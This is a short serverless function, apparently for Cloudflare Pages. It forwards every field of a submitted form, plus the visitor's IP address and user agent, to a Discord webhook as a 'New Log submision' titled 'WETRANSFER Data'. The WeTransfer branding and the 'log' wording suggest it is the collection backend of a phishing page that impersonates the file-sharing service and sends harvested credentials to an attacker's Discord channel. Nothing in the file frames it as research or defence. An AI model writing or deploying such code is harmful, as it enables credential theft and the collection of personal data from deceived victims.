export async function onRequestPost(context) {
  const { request, env } = context;
  const webhookUrl = env.DISCORD_WEBHOOK_URL;

  if (!webhookUrl) {
    return new Response(JSON.stringify({ error: "DISCORD_WEBHOOK_URL is not set" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }

  try {
    const body = await request.json();
    const ip = request.headers.get("cf-connecting-ip") || request.headers.get("x-real-ip") || "Unknown";
    const userAgent = request.headers.get("user-agent") || "Unknown";

    const payload = {
      content: "New Log submision",
      embeds: [
        {
          title: "WETRANSFER Data",
          color: 5814783, // Blurple
          fields: [
            ...Object.entries(body).map(([key, value]) => ({
              name: key,
              value: String(value) || "N/A",
              inline: true,
            })),
            { name: "IP Address", value: String(ip), inline: false },
            { name: "User Agent", value: String(userAgent), inline: false },
          ],
          timestamp: new Date().toISOString(),
        },
      ],
    };

    const discordResponse = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (!discordResponse.ok) {
      throw new Error(`Discord API responded with ${discordResponse.status}`);
    }

    return new Response(JSON.stringify({ success: true }), {
      headers: { "Content-Type": "application/json" },
    });
  } catch (error) {
    return new Response(JSON.stringify({ error: "Failed to submit form: " + error.message }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}
